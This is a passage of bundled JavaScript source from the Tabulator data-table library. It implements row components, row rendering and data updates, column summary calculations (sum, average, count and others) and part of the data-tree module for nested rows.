      console.error("Column Update Error - The updateDefinition function is only available on ungrouped columns");
      return Promise.reject("Column Update Error - The updateDefinition function is only available on columns, not column groups");
    }
  }
  deleteCell(cell) {
    var index = this.cells.indexOf(cell);
    if (index > -1) {
      this.cells.splice(index, 1);
    }
  }
  //////////////// Object Generation /////////////////
  getComponent() {
    if (!this.component) {
      this.component = new ColumnComponent(this);
    }
    return this.component;
  }
  getPosition() {
    return this.table.columnManager.getVisibleColumnsByIndex().indexOf(this) + 1;
  }
  getParentComponent() {
    return this.parent instanceof Column ? this.parent.getComponent() : false;
  }
}
class RowComponent {
  constructor(row) {
    this._row = row;
    return new Proxy(this, {
      get: function(target, name, receiver) {
        if (typeof target[name] !== "undefined") {
          return target[name];
        } else {
          return target._row.table.componentFunctionBinder.handle("row", target._row, name);
        }
      }
    });
  }
  getData(transform) {
    return this._row.getData(transform);
  }
  getElement() {
    return this._row.getElement();
  }
  getCells() {
    var cells = [];
    this._row.getCells().forEach(function(cell) {
      cells.push(cell.getComponent());
    });
    return cells;
  }
  getCell(column) {
    var cell = this._row.getCell(column);
    return cell ? cell.getComponent() : false;
  }
  getIndex() {
    return this._row.getData("data")[this._row.table.options.index];
  }
  getPosition() {
    return this._row.getPosition();
  }
  watchPosition(callback) {
    return this._row.watchPosition(callback);
  }
  delete() {
    return this._row.delete();
  }
  scrollTo(position, ifVisible) {
    return this._row.table.rowManager.scrollToRow(this._row, position, ifVisible);
  }
  move(to, after) {
    this._row.moveToRow(to, after);
  }
  update(data) {
    return this._row.updateData(data);
  }
  normalizeHeight() {
    this._row.normalizeHeight(true);
  }
  _getSelf() {
    return this._row;
  }
  reformat() {
    return this._row.reinitialize();
  }
  getTable() {
    return this._row.table;
  }
  getNextRow() {
    var row = this._row.nextRow();
    return row ? row.getComponent() : row;
  }
  getPrevRow() {
    var row = this._row.prevRow();
    return row ? row.getComponent() : row;
  }
}
class Row extends CoreFeature {
  constructor(data, parent, type = "row") {
    super(parent.table);
    this.parent = parent;
    this.data = {};
    this.type = type;
    this.element = false;
    this.modules = {};
    this.cells = [];
    this.height = 0;
    this.heightStyled = "";
    this.manualHeight = false;
    this.outerHeight = 0;
    this.initialized = false;
    this.heightInitialized = false;
    this.position = 0;
    this.positionWatchers = [];
    this.component = null;
    this.created = false;
    this.setData(data);
  }
  create() {
    if (!this.created) {
      this.created = true;
      this.generateElement();
    }
  }
  createElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-row");
    el.setAttribute("role", "row");
    this.element = el;
  }
  getElement() {
    this.create();
    return this.element;
  }
  detachElement() {
    if (this.element && this.element.parentNode) {
      this.element.parentNode.removeChild(this.element);
    }
  }
  generateElement() {
    this.createElement();
    this.dispatch("row-init", this);
  }
  generateCells() {
    this.cells = this.table.columnManager.generateCells(this);
  }
  //functions to setup on first render
  initialize(force, inFragment) {
    this.create();
    if (!this.initialized || force) {
      this.deleteCells();
      while (this.element.firstChild) this.element.removeChild(this.element.firstChild);
      this.dispatch("row-layout-before", this);
      this.generateCells();
      this.initialized = true;
      this.table.columnManager.renderer.renderRowCells(this, inFragment);
      if (force) {
        this.normalizeHeight();
      }
      this.dispatch("row-layout", this);
      if (this.table.options.rowFormatter) {
        this.table.options.rowFormatter(this.getComponent());
      }
      this.dispatch("row-layout-after", this);
    } else {
      this.table.columnManager.renderer.rerenderRowCells(this, inFragment);
    }
  }
  rendered() {
    this.cells.forEach((cell) => {
      cell.cellRendered();
    });
  }
  reinitializeHeight() {
    this.heightInitialized = false;
    if (this.element && this.element.offsetParent !== null) {
      this.normalizeHeight(true);
    }
  }
  deinitialize() {
    this.initialized = false;
  }
  deinitializeHeight() {
    this.heightInitialized = false;
  }
  reinitialize(children) {
    this.initialized = false;
    this.heightInitialized = false;
    if (!this.manualHeight) {
      this.height = 0;
      this.heightStyled = "";
    }
    if (this.element && this.element.offsetParent !== null) {
      this.initialize(true);
    }
    this.dispatch("row-relayout", this);
  }
  //get heights when doing bulk row style calcs in virtual DOM
  calcHeight(force) {
    var maxHeight = 0, minHeight = 0;
    if (this.table.options.rowHeight) {
      this.height = this.table.options.rowHeight;
    } else {
      minHeight = this.calcMinHeight();
      maxHeight = this.calcMaxHeight();
      if (force) {
        this.height = Math.max(maxHeight, minHeight);
      } else {
        this.height = this.manualHeight ? this.height : Math.max(maxHeight, minHeight);
      }
    }
    this.heightStyled = this.height ? this.height + "px" : "";
    this.outerHeight = this.element.offsetHeight;
  }
  calcMinHeight() {
    return this.table.options.resizableRows ? this.element.clientHeight : 0;
  }
  calcMaxHeight() {
    var maxHeight = 0;
    this.cells.forEach(function(cell) {
      var height = cell.getHeight();
      if (height > maxHeight) {
        maxHeight = height;
      }
    });
    return maxHeight;
  }
  //set of cells
  setCellHeight() {
    this.cells.forEach(function(cell) {
      cell.setHeight();
    });
    this.heightInitialized = true;
  }
  clearCellHeight() {
    this.cells.forEach(function(cell) {
      cell.clearHeight();
    });
  }
  //normalize the height of elements in the row
  normalizeHeight(force) {
    if (force && !this.table.options.rowHeight) {
      this.clearCellHeight();
    }
    this.calcHeight(force);
    this.setCellHeight();
  }
  //set height of rows
  setHeight(height, force) {
    if (this.height != height || force) {
      this.manualHeight = true;
      this.height = height;
      this.heightStyled = height ? height + "px" : "";
      this.setCellHeight();
      this.outerHeight = this.element.offsetHeight;
      if (this.subscribedExternal("rowHeight")) {
        this.dispatchExternal("rowHeight", this.getComponent());
      }
    }
  }
  //return rows outer height
  getHeight() {
    return this.outerHeight;
  }
  //return rows outer Width
  getWidth() {
    return this.element.offsetWidth;
  }
  //////////////// Cell Management /////////////////
  deleteCell(cell) {
    var index = this.cells.indexOf(cell);
    if (index > -1) {
      this.cells.splice(index, 1);
    }
  }
  //////////////// Data Management /////////////////
  setData(data) {
    this.data = this.chain("row-data-init-before", [this, data], void 0, data);
    this.dispatch("row-data-init-after", this);
  }
  //update the rows data
  updateData(updatedData) {
    var visible = this.element && Helpers.elVisible(this.element), tempData = {}, newRowData;
    return new Promise((resolve, reject) => {
      if (typeof updatedData === "string") {
        updatedData = JSON.parse(updatedData);
      }
      this.dispatch("row-data-save-before", this);
      if (this.subscribed("row-data-changing")) {
        tempData = Object.assign(tempData, this.data);
        tempData = Object.assign(tempData, updatedData);
      }
      newRowData = this.chain("row-data-changing", [this, tempData, updatedData], null, updatedData);
      for (let attrname in newRowData) {
        this.data[attrname] = newRowData[attrname];
      }
      this.dispatch("row-data-save-after", this);
      for (let attrname in updatedData) {
        let columns = this.table.columnManager.getColumnsByFieldRoot(attrname);
        columns.forEach((column) => {
          let cell = this.getCell(column.getField());
          if (cell) {
            let value = column.getFieldValue(newRowData);
            if (cell.getValue() !== value) {
              cell.setValueProcessData(value);
              if (visible) {
                cell.cellRendered();
              }
            }
          }
        });
      }
      if (visible) {
        this.normalizeHeight(true);
        if (this.table.options.rowFormatter) {
          this.table.options.rowFormatter(this.getComponent());
        }
      } else {
        this.initialized = false;
        this.height = 0;
        this.heightStyled = "";
      }
      this.dispatch("row-data-changed", this, visible, updatedData);
      this.dispatchExternal("rowUpdated", this.getComponent());
      if (this.subscribedExternal("dataChanged")) {
        this.dispatchExternal("dataChanged", this.table.rowManager.getData());
      }
      resolve();
    });
  }
  getData(transform) {
    if (transform) {
      return this.chain("row-data-retrieve", [this, transform], null, this.data);
    }
    return this.data;
  }
  getCell(column) {
    var match2 = false;
    column = this.table.columnManager.findColumn(column);
    if (!this.initialized && this.cells.length === 0) {
      this.generateCells();
    }
    match2 = this.cells.find(function(cell) {
      return cell.column === column;
    });
    return match2;
  }
  getCellIndex(findCell) {
    return this.cells.findIndex(function(cell) {
      return cell === findCell;
    });
  }
  findCell(subject) {
    return this.cells.find((cell) => {
      return cell.element === subject;
    });
  }
  getCells() {
    if (!this.initialized && this.cells.length === 0) {
      this.generateCells();
    }
    return this.cells;
  }
  nextRow() {
    var row = this.table.rowManager.nextDisplayRow(this, true);
    return row || false;
  }
  prevRow() {
    var row = this.table.rowManager.prevDisplayRow(this, true);
    return row || false;
  }
  moveToRow(to, before) {
    var toRow = this.table.rowManager.findRow(to);
    if (toRow) {
      this.table.rowManager.moveRowActual(this, toRow, !before);
      this.table.rowManager.refreshActiveData("display", false, true);
    } else {
      console.warn("Move Error - No matching row found:", to);
    }
  }
  ///////////////////// Actions  /////////////////////
  delete() {
    this.dispatch("row-delete", this);
    this.deleteActual();
    return Promise.resolve();
  }
  deleteActual(blockRedraw) {
    this.detachModules();
    this.table.rowManager.deleteRow(this, blockRedraw);
    this.deleteCells();
    this.initialized = false;
    this.heightInitialized = false;
    this.element = false;
    this.dispatch("row-deleted", this);
  }
  detachModules() {
    this.dispatch("row-deleting", this);
  }
  deleteCells() {
    var cellCount = this.cells.length;
    for (let i2 = 0; i2 < cellCount; i2++) {
      this.cells[0].delete();
    }
  }
  wipe() {
    this.detachModules();
    this.deleteCells();
    if (this.element) {
      while (this.element.firstChild) this.element.removeChild(this.element.firstChild);
      if (this.element.parentNode) {
        this.element.parentNode.removeChild(this.element);
      }
    }
    this.element = false;
    this.modules = {};
  }
  isDisplayed() {
    return this.table.rowManager.getDisplayRows().includes(this);
  }
  getPosition() {
    return this.isDisplayed() ? this.position : false;
  }
  setPosition(position) {
    if (position != this.position) {
      this.position = position;
      this.positionWatchers.forEach((callback) => {
        callback(this.position);
      });
    }
  }
  watchPosition(callback) {
    this.positionWatchers.push(callback);
    callback(this.position);
  }
  getGroup() {
    return this.modules.group || false;
  }
  //////////////// Object Generation /////////////////
  getComponent() {
    if (!this.component) {
      this.component = new RowComponent(this);
    }
    return this.component;
  }
}
var defaultCalculations = {
  "avg": function(values, data, calcParams) {
    var output = 0, precision = typeof calcParams.precision !== "undefined" ? calcParams.precision : 2;
    if (values.length) {
      output = values.reduce(function(sum, value) {
        return Number(sum) + Number(value);
      });
      output = output / values.length;
      output = precision !== false ? output.toFixed(precision) : output;
    }
    return parseFloat(output).toString();
  },
  "max": function(values, data, calcParams) {
    var output = null, precision = typeof calcParams.precision !== "undefined" ? calcParams.precision : false;
    values.forEach(function(value) {
      value = Number(value);
      if (value > output || output === null) {
        output = value;
      }
    });
    return output !== null ? precision !== false ? output.toFixed(precision) : output : "";
  },
  "min": function(values, data, calcParams) {
    var output = null, precision = typeof calcParams.precision !== "undefined" ? calcParams.precision : false;
    values.forEach(function(value) {
      value = Number(value);
      if (value < output || output === null) {
        output = value;
      }
    });
    return output !== null ? precision !== false ? output.toFixed(precision) : output : "";
  },
  "sum": function(values, data, calcParams) {
    var output = 0, precision = typeof calcParams.precision !== "undefined" ? calcParams.precision : false;
    if (values.length) {
      values.forEach(function(value) {
        value = Number(value);
        output += !isNaN(value) ? Number(value) : 0;
      });
    }
    return precision !== false ? output.toFixed(precision) : output;
  },
  "concat": function(values, data, calcParams) {
    var output = 0;
    if (values.length) {
      output = values.reduce(function(sum, value) {
        return String(sum) + String(value);
      });
    }
    return output;
  },
  "count": function(values, data, calcParams) {
    var output = 0;
    if (values.length) {
      values.forEach(function(value) {
        if (value) {
          output++;
        }
      });
    }
    return output;
  },
  "unique": function(values, data, calcParams) {
    var unique = values.filter((value, index) => {
      return (values || value === 0) && values.indexOf(value) === index;
    });
    return unique.length;
  }
};
class ColumnCalcs extends Module {
  static moduleName = "columnCalcs";
  //load defaults
  static calculations = defaultCalculations;
  constructor(table) {
    super(table);
    this.topCalcs = [];
    this.botCalcs = [];
    this.genColumn = false;
    this.topElement = this.createElement();
    this.botElement = this.createElement();
    this.topRow = false;
    this.botRow = false;
    this.topInitialized = false;
    this.botInitialized = false;
    this.blocked = false;
    this.recalcAfterBlock = false;
    this.registerTableOption("columnCalcs", true);
    this.registerColumnOption("topCalc");
    this.registerColumnOption("topCalcParams");
    this.registerColumnOption("topCalcFormatter");
    this.registerColumnOption("topCalcFormatterParams");
    this.registerColumnOption("bottomCalc");
    this.registerColumnOption("bottomCalcParams");
    this.registerColumnOption("bottomCalcFormatter");
    this.registerColumnOption("bottomCalcFormatterParams");
  }
  createElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-calcs-holder");
    return el;
  }
  initialize() {
    this.genColumn = new Column({ field: "value" }, this);
    this.subscribe("cell-value-changed", this.cellValueChanged.bind(this));
    this.subscribe("column-init", this.initializeColumnCheck.bind(this));
    this.subscribe("row-deleted", this.rowsUpdated.bind(this));
    this.subscribe("scroll-horizontal", this.scrollHorizontal.bind(this));
    this.subscribe("row-added", this.rowsUpdated.bind(this));
    this.subscribe("column-moved", this.recalcActiveRows.bind(this));
    this.subscribe("column-add", this.recalcActiveRows.bind(this));
    this.subscribe("data-refreshed", this.recalcActiveRowsRefresh.bind(this));
    this.subscribe("table-redraw", this.tableRedraw.bind(this));
    this.subscribe("rows-visible", this.visibleRows.bind(this));
    this.subscribe("scrollbar-vertical", this.adjustForScrollbar.bind(this));
    this.subscribe("redraw-blocked", this.blockRedraw.bind(this));
    this.subscribe("redraw-restored", this.restoreRedraw.bind(this));
    this.subscribe("table-redrawing", this.resizeHolderWidth.bind(this));
    this.subscribe("column-resized", this.resizeHolderWidth.bind(this));
    this.subscribe("column-show", this.resizeHolderWidth.bind(this));
    this.subscribe("column-hide", this.resizeHolderWidth.bind(this));
    this.registerTableFunction("getCalcResults", this.getResults.bind(this));
    this.registerTableFunction("recalc", this.userRecalc.bind(this));
    this.resizeHolderWidth();
  }
  resizeHolderWidth() {
    this.topElement.style.minWidth = this.table.columnManager.headersElement.offsetWidth + "px";
  }
  tableRedraw(force) {
    this.recalc(this.table.rowManager.activeRows);
    if (force) {
      this.redraw();
    }
  }
  blockRedraw() {
    this.blocked = true;
    this.recalcAfterBlock = false;
  }
  restoreRedraw() {
    this.blocked = false;
    if (this.recalcAfterBlock) {
      this.recalcAfterBlock = false;
      this.recalcActiveRowsRefresh();
    }
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  userRecalc() {
    this.recalc(this.table.rowManager.activeRows);
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  blockCheck() {
    if (this.blocked) {
      this.recalcAfterBlock = true;
    }
    return this.blocked;
  }
  visibleRows(viewable, rows2) {
    if (this.topRow) {
      rows2.unshift(this.topRow);
    }
    if (this.botRow) {
      rows2.push(this.botRow);
    }
    return rows2;
  }
  rowsUpdated(row) {
    if (this.table.options.groupBy) {
      this.recalcRowGroup(row);
    } else {
      this.recalcActiveRows();
    }
  }
  recalcActiveRowsRefresh() {
    if (this.table.options.groupBy && this.table.options.dataTreeStartExpanded && this.table.options.dataTree) {
      this.recalcAll();
    } else {
      this.recalcActiveRows();
    }
  }
  recalcActiveRows() {
    this.recalc(this.table.rowManager.activeRows);
  }
  cellValueChanged(cell) {
    if (cell.column.definition.topCalc || cell.column.definition.bottomCalc) {
      if (this.table.options.groupBy) {
        if (this.table.options.columnCalcs == "table" || this.table.options.columnCalcs == "both") {
          this.recalcActiveRows();
        }
        if (this.table.options.columnCalcs != "table") {
          this.recalcRowGroup(cell.row);
        }
      } else {
        this.recalcActiveRows();
      }
    }
  }
  initializeColumnCheck(column) {
    if (column.definition.topCalc || column.definition.bottomCalc) {
      this.initializeColumn(column);
    }
  }
  //initialize column calcs
  initializeColumn(column) {
    var def = column.definition;
    var config = {
      topCalcParams: def.topCalcParams || {},
      botCalcParams: def.bottomCalcParams || {}
    };
    if (def.topCalc) {
      switch (typeof def.topCalc) {
        case "string":
          if (ColumnCalcs.calculations[def.topCalc]) {
            config.topCalc = ColumnCalcs.calculations[def.topCalc];
          } else {
            console.warn("Column Calc Error - No such calculation found, ignoring: ", def.topCalc);
          }
          break;
        case "function":
          config.topCalc = def.topCalc;
          break;
      }
      if (config.topCalc) {
        column.modules.columnCalcs = config;
        this.topCalcs.push(column);
        if (this.table.options.columnCalcs != "group") {
          this.initializeTopRow();
        }
      }
    }
    if (def.bottomCalc) {
      switch (typeof def.bottomCalc) {
        case "string":
          if (ColumnCalcs.calculations[def.bottomCalc]) {
            config.botCalc = ColumnCalcs.calculations[def.bottomCalc];
          } else {
            console.warn("Column Calc Error - No such calculation found, ignoring: ", def.bottomCalc);
          }
          break;
        case "function":
          config.botCalc = def.bottomCalc;
          break;
      }
      if (config.botCalc) {
        column.modules.columnCalcs = config;
        this.botCalcs.push(column);
        if (this.table.options.columnCalcs != "group") {
          this.initializeBottomRow();
        }
      }
    }
  }
  //dummy functions to handle being mock column manager
  registerColumnField() {
  }
  removeCalcs() {
    var changed = false;
    if (this.topInitialized) {
      this.topInitialized = false;
      this.topElement.parentNode.removeChild(this.topElement);
      changed = true;
    }
    if (this.botInitialized) {
      this.botInitialized = false;
      this.footerRemove(this.botElement);
      changed = true;
    }
    if (changed) {
      this.table.rowManager.adjustTableSize();
    }
  }
  reinitializeCalcs() {
    if (this.topCalcs.length) {
      this.initializeTopRow();
    }
    if (this.botCalcs.length) {
      this.initializeBottomRow();
    }
  }
  initializeTopRow() {
    var fragment = document.createDocumentFragment();
    if (!this.topInitialized) {
      fragment.appendChild(document.createElement("br"));
      fragment.appendChild(this.topElement);
      this.table.columnManager.getContentsElement().insertBefore(fragment, this.table.columnManager.headersElement.nextSibling);
      this.topInitialized = true;
    }
  }
  initializeBottomRow() {
    if (!this.botInitialized) {
      this.footerPrepend(this.botElement);
      this.botInitialized = true;
    }
  }
  scrollHorizontal(left2) {
    if (this.botInitialized && this.botRow) {
      this.botElement.scrollLeft = left2;
    }
  }
  recalc(rows2) {
    var data, row;
    if (!this.blockCheck()) {
      if (this.topInitialized || this.botInitialized) {
        data = this.rowsToData(rows2);
        if (this.topInitialized) {
          if (this.topRow) {
            this.topRow.deleteCells();
          }
          row = this.generateRow("top", data);
          this.topRow = row;
          while (this.topElement.firstChild) this.topElement.removeChild(this.topElement.firstChild);
          this.topElement.appendChild(row.getElement());
          row.initialize(true);
        }
        if (this.botInitialized) {
          if (this.botRow) {
            this.botRow.deleteCells();
          }
          row = this.generateRow("bottom", data);
          this.botRow = row;
          while (this.botElement.firstChild) this.botElement.removeChild(this.botElement.firstChild);
          this.botElement.appendChild(row.getElement());
          row.initialize(true);
        }
        this.table.rowManager.adjustTableSize();
        if (this.table.modExists("frozenColumns")) {
          this.table.modules.frozenColumns.layout();
        }
      }
    }
  }
  recalcRowGroup(row) {
    this.recalcGroup(this.table.modules.groupRows.getRowGroup(row));
  }
  recalcAll() {
    if (this.topCalcs.length || this.botCalcs.length) {
      if (this.table.options.columnCalcs !== "group") {
        this.recalcActiveRows();
      }
      if (this.table.options.groupBy && this.table.options.columnCalcs !== "table") {
        var groups = this.table.modules.groupRows.getChildGroups();
        groups.forEach((group) => {
          this.recalcGroup(group);
        });
      }
    }
  }
  recalcGroup(group) {
    var data, rowData;
    if (!this.blockCheck()) {
      if (group) {
        if (group.calcs) {
          if (group.calcs.bottom) {
            data = this.rowsToData(group.rows);
            rowData = this.generateRowData("bottom", data);
            group.calcs.bottom.updateData(rowData);
            group.calcs.bottom.reinitialize();
          }
          if (group.calcs.top) {
            data = this.rowsToData(group.rows);
            rowData = this.generateRowData("top", data);
            group.calcs.top.updateData(rowData);
            group.calcs.top.reinitialize();
          }
        }
      }
    }
  }
  //generate top stats row
  generateTopRow(rows2) {
    return this.generateRow("top", this.rowsToData(rows2));
  }
  //generate bottom stats row
  generateBottomRow(rows2) {
    return this.generateRow("bottom", this.rowsToData(rows2));
  }
  rowsToData(rows2) {
    var data = [], hasDataTreeColumnCalcs = this.table.options.dataTree && this.table.options.dataTreeChildColumnCalcs, dataTree = this.table.modules.dataTree;
    rows2.forEach((row) => {
      data.push(row.getData());
      if (hasDataTreeColumnCalcs && row.modules.dataTree?.open) {
        this.rowsToData(dataTree.getFilteredTreeChildren(row)).forEach((dataRow) => {
          data.push(row);
        });
      }
    });
    return data;
  }
  //generate stats row
  generateRow(pos, data) {
    var rowData = this.generateRowData(pos, data), row;
    if (this.table.modExists("mutator")) {
      this.table.modules.mutator.disable();
    }
    row = new Row(rowData, this, "calc");
    if (this.table.modExists("mutator")) {
      this.table.modules.mutator.enable();
    }
    row.getElement().classList.add("tabulator-calcs", "tabulator-calcs-" + pos);
    row.component = false;
    row.getComponent = () => {
      if (!row.component) {
        row.component = new CalcComponent(row);
      }
      return row.component;
    };
    row.generateCells = () => {
      var cells = [];
      this.table.columnManager.columnsByIndex.forEach((column) => {
        this.genColumn.setField(column.getField());
        this.genColumn.hozAlign = column.hozAlign;
        if (column.definition[pos + "CalcFormatter"] && this.table.modExists("format")) {
          this.genColumn.modules.format = {
            formatter: this.table.modules.format.lookupFormatter(column.definition[pos + "CalcFormatter"]),
            params: column.definition[pos + "CalcFormatterParams"] || {}
          };
        } else {
          this.genColumn.modules.format = {
            formatter: this.table.modules.format.lookupFormatter("plaintext"),
            params: {}
          };
        }
        this.genColumn.definition.cssClass = column.definition.cssClass;
        var cell = new Cell(this.genColumn, row);
        cell.getElement();
        cell.column = column;
        cell.setWidth();
        column.cells.push(cell);
        cells.push(cell);
        if (!column.visible) {
          cell.hide();
        }
      });
      row.cells = cells;
    };
    return row;
  }
  //generate stats row
  generateRowData(pos, data) {
    var rowData = {}, calcs = pos == "top" ? this.topCalcs : this.botCalcs, type = pos == "top" ? "topCalc" : "botCalc", params, paramKey;
    calcs.forEach(function(column) {
      var values = [];
      if (column.modules.columnCalcs && column.modules.columnCalcs[type]) {
        data.forEach(function(item) {
          values.push(column.getFieldValue(item));
        });
        paramKey = type + "Params";
        params = typeof column.modules.columnCalcs[paramKey] === "function" ? column.modules.columnCalcs[paramKey](values, data) : column.modules.columnCalcs[paramKey];
        column.setFieldValue(rowData, column.modules.columnCalcs[type](values, data, params));
      }
    });
    return rowData;
  }
  hasTopCalcs() {
    return !!this.topCalcs.length;
  }
  hasBottomCalcs() {
    return !!this.botCalcs.length;
  }
  //handle table redraw
  redraw() {
    if (this.topRow) {
      this.topRow.normalizeHeight(true);
    }
    if (this.botRow) {
      this.botRow.normalizeHeight(true);
    }
  }
  //return the calculated
  getResults() {
    var results = {}, groups;
    if (this.table.options.groupBy && this.table.modExists("groupRows")) {
      groups = this.table.modules.groupRows.getGroups(true);
      groups.forEach((group) => {
        results[group.getKey()] = this.getGroupResults(group);
      });
    } else {
      results = {
        top: this.topRow ? this.topRow.getData() : {},
        bottom: this.botRow ? this.botRow.getData() : {}
      };
    }
    return results;
  }
  //get results from a group
  getGroupResults(group) {
    var groupObj = group._getSelf(), subGroups = group.getSubGroups(), subGroupResults = {}, results = {};
    subGroups.forEach((subgroup) => {
      subGroupResults[subgroup.getKey()] = this.getGroupResults(subgroup);
    });
    results = {
      top: groupObj.calcs.top ? groupObj.calcs.top.getData() : {},
      bottom: groupObj.calcs.bottom ? groupObj.calcs.bottom.getData() : {},
      groups: subGroupResults
    };
    return results;
  }
  adjustForScrollbar(width) {
    if (this.botRow) {
      if (this.table.rtl) {
        this.botElement.style.paddingLeft = width + "px";
      } else {
        this.botElement.style.paddingRight = width + "px";
      }
    }
  }
}
class DataTree extends Module {
  static moduleName = "dataTree";
  constructor(table) {
    super(table);
    this.indent = 10;
    this.field = "";
    this.collapseEl = null;
    this.expandEl = null;
    this.branchEl = null;
    this.elementField = false;
    this.startOpen = function() {
    };
    this.registerTableOption("dataTree", false);
    this.registerTableOption("dataTreeFilter", true);
    this.registerTableOption("dataTreeSort", true);
    this.registerTableOption("dataTreeElementColumn", false);
    this.registerTableOption("dataTreeBranchElement", true);
    this.registerTableOption("dataTreeChildIndent", 9);
    this.registerTableOption("dataTreeChildField", "_children");
    this.registerTableOption("dataTreeCollapseElement", false);
    this.registerTableOption("dataTreeExpandElement", false);
    this.registerTableOption("dataTreeStartExpanded", false);
    this.registerTableOption("dataTreeChildColumnCalcs", false);
    this.registerTableOption("dataTreeSelectPropagate", false);
    this.registerComponentFunction("row", "treeCollapse", this.collapseRow.bind(this));
    this.registerComponentFunction("row", "treeExpand", this.expandRow.bind(this));
    this.registerComponentFunction("row", "treeToggle", this.toggleRow.bind(this));
    this.registerComponentFunction("row", "getTreeParent", this.getTreeParent.bind(this));
    this.registerComponentFunction("row", "getTreeChildren", this.getRowChildren.bind(this));
    this.registerComponentFunction("row", "addTreeChild", this.addTreeChildRow.bind(this));
    this.registerComponentFunction("row", "isTreeExpanded", this.isRowExpanded.bind(this));
  }
  initialize() {
    if (this.table.options.dataTree) {
      var dummyEl = null, options = this.table.options;
      this.field = options.dataTreeChildField;
      this.indent = options.dataTreeChildIndent;
      if (this.options("movableRows")) {
        console.warn("The movableRows option is not available with dataTree enabled, moving of child rows could result in unpredictable behavior");
      }
      if (options.dataTreeBranchElement) {
        if (options.dataTreeBranchElement === true) {
          this.branchEl = document.createElement("div");
          this.branchEl.classList.add("tabulator-data-tree-branch");
        } else {
          if (typeof options.dataTreeBranchElement === "string") {
            dummyEl = document.createElement("div");
            dummyEl.innerHTML = options.dataTreeBranchElement;
            this.branchEl = dummyEl.firstChild;
          } else {
            this.branchEl = options.dataTreeBranchElement;
          }
        }
      } else {
        this.branchEl = document.createElement("div");
        this.branchEl.classList.add("tabulator-data-tree-branch-empty");
      }
      if (options.dataTreeCollapseElement) {
        if (typeof options.dataTreeCollapseElement === "string") {
          dummyEl = document.createElement("div");
          dummyEl.innerHTML = options.dataTreeCollapseElement;
          this.collapseEl = dummyEl.firstChild;
        } else {
          this.collapseEl = options.dataTreeCollapseElement;
        }
      } else {
        this.collapseEl = document.createElement("div");
        this.collapseEl.classList.add("tabulator-data-tree-control");
        this.collapseEl.tabIndex = 0;
        this.collapseEl.innerHTML = "<div class='tabulator-data-tree-control-collapse'></div>";
      }
      if (options.dataTreeExpandElement) {
        if (typeof options.dataTreeExpandElement === "string") {
          dummyEl = document.createElement("div");
          dummyEl.innerHTML = options.dataTreeExpandElement;
          this.expandEl = dummyEl.firstChild;
        } else {
          this.expandEl = options.dataTreeExpandElement;
        }
      } else {
        this.expandEl = document.createElement("div");
        this.expandEl.classList.add("tabulator-data-tree-control");
        this.expandEl.tabIndex = 0;
        this.expandEl.innerHTML = "<div class='tabulator-data-tree-control-expand'></div>";
      }
      switch (typeof options.dataTreeStartExpanded) {
        case "boolean":
          this.startOpen = function(row, index) {
            return options.dataTreeStartExpanded;
          };
          break;
        case "function":
          this.startOpen = options.dataTreeStartExpanded;
          break;
        default:
          this.startOpen = function(row, index) {
            return options.dataTreeStartExpanded[index];
          };
          break;
      }
      this.subscribe("row-init", this.initializeRow.bind(this));
      this.subscribe("row-layout-after", this.layoutRow.bind(this));
      this.subscribe("row-deleted", this.rowDelete.bind(this), 0);
      this.subscribe("row-data-changed", this.rowDataChanged.bind(this), 10);
      this.subscribe("cell-value-updated", this.cellValueChanged.bind(this));
      this.subscribe("edit-cancelled", this.cellValueChanged.bind(this));
      this.subscribe("column-moving-rows", this.columnMoving.bind(this));
      this.subscribe("table-built", this.initializeElementField.bind(this));
      this.subscribe("table-redrawing", this.tableRedrawing.bind(this));
      this.registerDisplayHandler(this.getRows.bind(this), 30);
    }
  }
  tableRedrawing(force) {
    var rows2;
    if (force) {
      rows2 = this.table.rowManager.getRows();
      rows2.forEach((row) => {
        this.reinitializeRowChildren(row);
      });
    }
  }
  initializeElementField() {
    var firstCol = this.table.columnManager.getFirstVisibleColumn();
    this.elementField = this.table.options.dataTreeElementColumn || (firstCol ? firstCol.field : false);
  }
  getRowChildren(row) {
    return this.getTreeChildren(row, true);
  }
  columnMoving() {
    var rows2 = [];
    this.table.rowManager.rows.forEach((row) => {
      rows2 = rows2.concat(this.getTreeChildren(row, false, true));
    });
    return rows2;
  }
  rowDataChanged(row, visible, updatedData) {
    if (this.redrawNeeded(updatedData)) {
      this.initializeRow(row);
      if (visible) {
        this.layoutRow(row);
        this.refreshData(true);
      }
    }
  }
  cellValueChanged(cell) {
    var field = cell.column.getField();
    if (field === this.elementField) {
      this.layoutRow(cell.row);
    }
  }
  initializeRow(row) {
    var childArray = row.getData()[this.field];
    var isArray2 = Array.isArray(childArray);
    var children = isArray2 || !isArray2 && typeof childArray === "object" && childArray !== null;
    if (!children && row.modules.dataTree && row.modules.dataTree.branchEl) {
      row.modules.dataTree.branchEl.parentNode.removeChild(row.modules.dataTree.branchEl);
    }
    if (!children && row.modules.dataTree && row.modules.dataTree.controlEl) {
      row.modules.dataTree.controlEl.parentNode.removeChild(row.modules.dataTree.controlEl);
    }
    row.modules.dataTree = {
      index: row.modules.dataTree ? row.modules.dataTree.index : 0,
      open: children ? row.modules.dataTree ? row.modules.dataTree.open : this.startOpen(row.getComponent(), 0) : false,
      controlEl: row.modules.dataTree && children ? row.modules.dataTree.controlEl : false,
      branchEl: row.modules.dataTree && children ? row.modules.dataTree.branchEl : false,
      parent: row.modules.dataTree ? row.modules.dataTree.parent : false,
      children
    };
  }
  reinitializeRowChildren(row) {
    var children = this.getTreeChildren(row, false, true);
    children.forEach(function(child) {
      child.reinitialize(true);
    });
  }
  layoutRow(row) {
    var cell = this.elementField ? row.getCell(this.elementField) : row.getCells()[0], el = cell.getElement(), config = row.modules.dataTree;
    if (config.branchEl) {
      if (config.branchEl.parentNode) {
        config.branchEl.parentNode.removeChild(config.branchEl);
      }
      config.branchEl = false;
    }
    if (config.controlEl) {
      if (config.controlEl.parentNode) {
        config.controlEl.parentNode.removeChild(config.controlEl);
      }
      config.controlEl = false;
    }
    this.generateControlElement(row, el);
    row.getElement().classList.add("tabulator-tree-level-" + config.index);
    if (config.index) {
      if (this.branchEl) {
        config.branchEl = this.branchEl.cloneNode(true);
        el.insertBefore(config.branchEl, el.firstChild);
        if (this.table.rtl) {
          config.branchEl.style.marginRight = (config.branchEl.offsetWidth + config.branchEl.style.marginLeft) * (config.index - 1) + config.index * this.indent + "px";
        } else {
